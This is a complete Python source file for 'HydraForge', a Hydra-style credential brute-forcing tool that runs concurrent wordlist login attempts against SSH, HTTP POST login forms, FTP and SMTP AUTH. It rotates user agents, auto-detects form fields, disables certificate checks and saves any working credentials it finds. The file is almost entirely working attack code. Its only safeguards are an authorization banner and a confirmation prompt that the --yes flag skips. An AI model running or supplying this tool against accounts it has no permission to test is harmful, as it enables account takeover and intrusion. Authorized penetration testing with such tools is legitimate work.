#!/usr/bin/env python3
"""
HydraForge v1.0 — Hydra-like brute forcing tool (SSH / HTTP POST / FTP / SMTP AUTH)

Dependencies:
  pip install aiohttp paramiko beautifulsoup4

Supported modules:
  - ssh            (password auth, requires paramiko)
  - http-post-form (HTTP form POST login)
  - ftp            (FTP login)
  - smtp-auth      (SMTP AUTH LOGIN / PLAIN)

Usage examples:
  python3 hydraforge.py -L users.txt -P passwords.txt -M ssh --target ssh://10.0.0.5:22 -t 20 -o found.txt
  python3 hydraforge.py -l admin -P passwords.txt -M http-post-form --target http://example.com/login.php -t 10 --username-field user --password-field pass --auto-form

WARNING: Use only on systems you own or have explicit written permission to test.
"""

from dataclasses import dataclass
import argparse
import asyncio
import aiohttp
import concurrent.futures
import paramiko
import ftplib
import smtplib
import socket
import sys
import time
import random
import re
from typing import List, Tuple, Dict, Optional
from urllib.parse import urlparse, urljoin

# optional
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except Exception:
    HAS_BS4 = False

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

TOOL_NAME = "HydraForge"
VERSION = "1.0"

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
]

@dataclass
class Result:
    module: str
    host: str
    port: Optional[int]
    username: str
    password: str
    success: bool
    reason: str

class HydraForge:
    def __init__(self, args):
        self.args = args
        self.found: List[Result] = []
        self.attempts = 0
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.loop = asyncio.get_event_loop()
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=max(4, args.threads))
        self._output_lock = asyncio.Lock()
        self._output_file = args.output

    def banner(self):
        b = f"""
{CYAN}{BOLD}
██╗  ██╗██████╗ ██████╗ █████╗  ██████╗███████╗██████╗ ███████╗██████╗
██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗
███████║██████╔╝██████╔╝███████║██║     █████╗  ██████╔╝█████╗  ██████╔╝
██╔══██║██╔═══╝ ██╔═══╝ ██╔══██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
██║  ██║██║     ██║     ██║  ██║╚██████╗███████╗██║  ██║███████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                      {TOOL_NAME}  v{VERSION}
{RESET}
{YELLOW}Authorized use only. By continuing you confirm you have permission to test the target.{RESET}
"""
        print(b)

    async def run(self):
        # parse users and passwords
        users = []
        if self.args.userlist:
            users = self._load_file(self.args.userlist)
        if self.args.user:
            users = [self.args.user] if not users else users

        if not users:
            print(f"{RED}No users provided (-L or -l).{RESET}")
            return

        passwords = self._load_file(self.args.passlist)
        if not passwords:
            print(f"{RED}No passwords provided (-P).{RESET}")
            return

        # parse target
        parsed = urlparse(self.args.target)
        module = self.args.module.lower()
        target_host = parsed.hostname or self.args.target
        target_port = parsed.port
        path = parsed.path or ''
        scheme = parsed.scheme or ''

        # interactive confirmation if TTY
        if sys.stdin.isatty() and not self.args.yes:
            confirm = input(f"{YELLOW}Confirm authorized testing against {self.args.target} for module {module} (yes/NO): {RESET}").strip().lower()
            if confirm != 'yes':
                print(f"{GREEN}Aborted.{RESET}")
                return

        # route to module
        if module == 'ssh':
            await self._run_ssh(target_host, target_port or 22, users, passwords)
        elif module == 'http-post-form':
            target_url = self.args.target
            if not scheme:
                # assume http if plain host provided
                target_url = f"http://{target_host}{path}"
            await self._run_http_form(target_url, users, passwords)
        elif module == 'ftp':
            await self._run_ftp(target_host, target_port or 21, users, passwords)
        elif module == 'smtp-auth':
            await self._run_smtp(target_host, target_port or 25, users, passwords)
        else:
            print(f"{RED}Unknown module: {module}{RESET}")
            return

        self._summary()

    def _load_file(self, path: str) -> List[str]:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip()]
            print(f"{GREEN}[+] Loaded {len(lines)} entries from {path}{RESET}")
            return lines
        except Exception as e:
            print(f"{RED}Failed to read {path}: {e}{RESET}")
            return []

    def _print_hydra_line(self, res: Result):
        # Standard Hydra-like output line: [port][module] host: X   login: Y   password: Z
        port = res.port or ''
        line = f"[{port}][{res.module}] host: {res.host}\tlogin: {res.username}\tpassword: {res.password}"
        if res.success:
            print(f"{GREEN}{line}{RESET}")
        else:
            # don't print failed attempts to avoid spamming; but count attempts
            # Optionally print verbose failed lines
            if self.args.verbose:
                print(f"{YELLOW}{line}   ({res.reason}){RESET}")

    def _write_output(self, res: Result):
        if not self._output_file:
            return
        try:
            with open(self._output_file, 'a') as f:
                f.write(f"{res.module},{res.host},{res.port or ''},{res.username},{res.password},{res.reason}\n")
        except Exception:
            pass

    def _record_result(self, res: Result):
        self.found.append(res)
        # print found line
        self._print_hydra_line(res)
        # save
        self._write_output(res)

    def _summary(self):
        print("\n" + BOLD + "=== SUMMARY ===" + RESET)
        print(f"Module: {self.args.module}   Target: {self.args.target}")
        print(f"Total attempts: {self.attempts}")
        print(f"Valid credentials found: {len(self.found)}")
        for r in self.found:
            print(f"{GREEN}• [{r.port}][{r.module}] {r.host}  {r.username}:{r.password} ({r.reason}){RESET}")

    # -------------------
    # SSH (paramiko)
    # -------------------
    async def _run_ssh(self, host: str, port: int, users: List[str], passwords: List[str]):
        sem = asyncio.Semaphore(self.args.threads)
        tasks = []
        for u in users:
            for p in passwords:
                tasks.append(self._ssh_task(host, port, u, p, sem))
        # run tasks with bounded concurrency
        await asyncio.gather(*tasks)

    async def _ssh_task(self, host, port, user, password, sem):
        async with sem:
            self.attempts += 1
            # run blocking paramiko in executor
            def attempt():
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(hostname=host, port=port, username=user, password=password,
                                   timeout=self.args.timeout, banner_timeout=self.args.timeout,
                                   auth_timeout=self.args.timeout, look_for_keys=False, allow_agent=False)
                    client.close()
                    return True, "Authentication successful"
                except paramiko.AuthenticationException:
                    return False, "Authentication failed"
                except Exception as e:
                    return False, f"Conn error: {e}"
            success, reason = await self.loop.run_in_executor(self.executor, attempt)
            res = Result(module='ssh', host=host, port=port, username=user, password=password, success=success, reason=reason)
            if success:
                self._record_result(res)
            else:
                if self.args.verbose:
                    self._print_hydra_line(res)

    # -------------------
    # HTTP POST FORM
    # -------------------
    async def _run_http_form(self, url: str, users: List[str], passwords: List[str]):
        # gather field names
        username_field = self.args.username_field or 'username'
        password_field = self.args.password_field or 'password'
        hidden_template = {}
        if self.args.auto_form:
            if not HAS_BS4:
                print(f"{YELLOW}beautifulsoup4 not installed; cannot auto-detect form. Install with 'pip install beautifulsoup4'{RESET}")
            else:
                print("[*] Attempting to auto-detect form fields...")
                try:
                    async with aiohttp.ClientSession() as s:
                        async with s.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, ssl=False) as r:
                            html = await r.text()
                            soup = BeautifulSoup(html, 'html.parser')
                            form = None
                            for f in soup.find_all('form'):
                                if f.find('input', {'type':'password'}):
                                    form = f
                                    break
                            if form:
                                # extract fields
                                pf = form.find('input', {'type':'password'})
                                password_field = pf.get('name') or password_field
                                # find a text/email input for username
                                uf = form.find('input', {'type': re.compile('text|email', re.I)})
                                if uf and uf.get('name'):
                                    username_field = uf.get('name')
                                action = form.get('action') or url
                                url = urljoin(str(r.url), action)
                                for hid in form.find_all('input', {'type':'hidden'}):
                                    if hid.get('name'):
                                        hidden_template[hid.get('name')] = hid.get('value') or ''
                                print(f"{GREEN}[+] Detected fields -> user: {username_field}, pass: {password_field}, action: {url}{RESET}")
                            else:
                                print(f"{YELLOW}No form with password input detected; using provided fields.{RESET}")
                except Exception as e:
                    print(f"{YELLOW}Auto-form detection error: {e}{RESET}")

        connector = aiohttp.TCPConnector(limit=self.args.threads, ssl=not self.args.disable_ssl)
        timeout = aiohttp.ClientTimeout(total=self.args.timeout)
        sem = asyncio.Semaphore(self.args.threads)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async def worker(u, p):
                async with sem:
                    self.attempts += 1
                    data = {}
                    data[username_field] = u
                    data[password_field] = p
                    data.update(hidden_template)
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    try:
                        async with session.post(url, data=data, headers=headers, allow_redirects=True, ssl=False) as resp:
                            text = await resp.text()
                            # heuristics for success
                            lowered = text.lower()
                            success = False
                            reason = f"HTTP {resp.status}"
                            if self.args.success_string and self.args.success_string.lower() in lowered:
                                success = True
                                reason = "Success string matched"
                            elif self.args.failure_string and self.args.failure_string.lower() in lowered:
                                success = False
                            elif resp.status in (302, 303):
                                success = True
                                reason = "Redirected"
                            elif any(k in lowered for k in ['logout','dashboard','welcome','profile','sign out']):
                                success = True
                                reason = "Success indicator in body"
                            res = Result(module='http-post-form', host=url, port=None, username=u, password=p, success=success, reason=reason)
                            if success:
                                self._record_result(res)
                            else:
                                if self.args.verbose:
                                    self._print_hydra_line(res)
                    except Exception as e:
                        if self.args.verbose:
                            r = Result(module='http-post-form', host=url, port=None, username=u, password=p, success=False, reason=f"Request error: {e}")
                            self._print_hydra_line(r)

            # build tasks
            tasks = [worker(u, p) for u in users for p in passwords]
            # throttle chunking to avoid memory explosion
            batch = 1000
            for i in range(0, len(tasks), batch):
                await asyncio.gather(*tasks[i:i+batch])

    # -------------------
    # FTP
    # -------------------
    async def _run_ftp(self, host: str, port: int, users: List[str], passwords: List[str]):
        sem = asyncio.Semaphore(self.args.threads)
        async def ftp_try(u, p):
            async with sem:
                self.attempts += 1
                def attempt():
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(host, port, timeout=self.args.timeout)
                        ftp.login(user=u, passwd=p)
                        ftp.quit()
                        return True, "Login successful"
                    except ftplib.error_perm as e:
                        return False, "Authentication failed"
                    except Exception as e:
                        return False, f"Conn error: {e}"
                success, reason = await self.loop.run_in_executor(self.executor, attempt)
                res = Result(module='ftp', host=host, port=port, username=u, password=p, success=success, reason=reason)
                if success:
                    self._record_result(res)
                else:
                    if self.args.verbose:
                        self._print_hydra_line(res)
        tasks = [ftp_try(u,p) for u in users for p in passwords]
        await asyncio.gather(*tasks)

    # -------------------
    # SMTP AUTH (PLAIN/LOGIN)
    # -------------------
    async def _run_smtp(self, host: str, port: int, users: List[str], passwords: List[str]):
        sem = asyncio.Semaphore(self.args.threads)
        use_tls = self.args.tls
        async def smtp_try(u,p):
            async with sem:
                self.attempts += 1
                def attempt():
                    try:
                        s = smtplib.SMTP(host=host, port=port, timeout=self.args.timeout)
                        s.ehlo()
                        if use_tls:
                            try:
                                s.starttls()
                                s.ehlo()
                            except Exception:
                                pass
                        # try login
                        try:
                            s.login(u, p)
                            s.quit()
                            return True, "Auth successful"
                        except smtplib.SMTPAuthenticationError:
                            s.quit()
                            return False, "Authentication failed"
                        except Exception as e:
                            try:
                                s.quit()
                            except Exception:
                                pass
                            return False, f"Auth error: {e}"
                    except Exception as e:
                        return False, f"Conn error: {e}"
                success, reason = await self.loop.run_in_executor(self.executor, attempt)
                res = Result(module='smtp-auth', host=host, port=port, username=u, password=p, success=success, reason=reason)
                if success:
                    self._record_result(res)
                else:
                    if self.args.verbose:
                        self._print_hydra_line(res)
        tasks = [smtp_try(u,p) for u in users for p in passwords]
        await asyncio.gather(*tasks)

# -----------------------
# CLI parsing
# -----------------------
def parse_args():
    p = argparse.ArgumentParser(description=f"{TOOL_NAME} — Hydra-like brute force (authorized testing only)")
    group = p.add_mutually_exclusive_group(required=True)
    group.add_argument('-L', '--userlist', help='File with usernames (one per line)')
    group.add_argument('-l', '--user', help='Single username')
    p.add_argument('-P', '--passlist', required=True, help='File with passwords (one per line)')
    p.add_argument('-M', '--module', required=True, choices=['ssh','http-post-form','ftp','smtp-auth'], help='Module to use')
    p.add_argument('--target', required=True, help='Target (e.g. ssh://host:22 or http://example.com/login.php). For ftp/smtp use ftp://host:21 or smtp://host:25 (scheme optional)')
    p.add_argument('-t', '--threads', type=int, default=10, help='Concurrent threads/requests (hydra -t)')
    p.add_argument('-T', '--timeout', type=int, default=15, help='Timeout seconds for connections')
    p.add_argument('-o', '--output', help='Append valid credentials to output file (csv)')
    p.add_argument('--username-field', help='username field name for http-post-form')
    p.add_argument('--password-field', help='password field name for http-post-form')
    p.add_argument('--auto-form', action='store_true', help='Auto-detect HTTP form (needs beautifulsoup4)')
    p.add_argument('--success-string', help='String indicating success in HTTP response body')
    p.add_argument('--failure-string', help='String indicating failure in HTTP response body')
    p.add_argument('--tls', action='store_true', help='Use STARTTLS for SMTP or force TLS when building HTTP URL')
    p.add_argument('--disable-ssl', action='store_true', help='Disable SSL verification (for HTTP requests)')
    p.add_argument('-v', '--verbose', action='store_true', help='Verbose output (prints failures)')
    p.add_argument('--yes', action='store_true', help='Skip interactive confirmation (use carefully)')
    return p.parse_args()

# map small names
def args_fix(args):
    # make args timeout/threads easy access
    args.timeout = args.T if hasattr(args, 'T') else args.timeout
    # copy convenience
    args.threads = args.threads
    args.disable_ssl = args.disable_ssl if hasattr(args,'disable_ssl') else False
    return args

# -----------------------
# main
# -----------------------
def main():
    args = parse_args()
    # normalize
    args = args_fix(args)
    tool = HydraForge(args)
    tool.banner()
    # stash commonly used values
    tool.args.timeout = getattr(args, 'timeout', 15)
    tool.args.threads = getattr(args, 'threads', 10)
    tool.args.disable_ssl = getattr(args, 'disable_ssl', False)
    # map small names
    tool.args.passlist = args.passlist
    tool.args.userlist = args.userlist
    tool.args.user = args.user
    tool.args.module = args.module
    tool.args.target = args.target
    tool.args.output = args.output
    tool.args.auto_form = getattr(args, 'auto_form', False)
    tool.args.username_field = getattr(args, 'username_field', None)
    tool.args.password_field = getattr(args, 'password_field', None)
    tool.args.success_string = getattr(args, 'success_string', None)
    tool.args.failure_string = getattr(args, 'failure_string', None)
    tool.args.verbose = getattr(args, 'verbose', False)
    tool.args.tls = getattr(args, 'tls', False)
    tool.args.yes = getattr(args, 'yes', False)

    try:
        asyncio.run(tool.run())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrupted by user{RESET}")

if __name__ == '__main__':
    main()
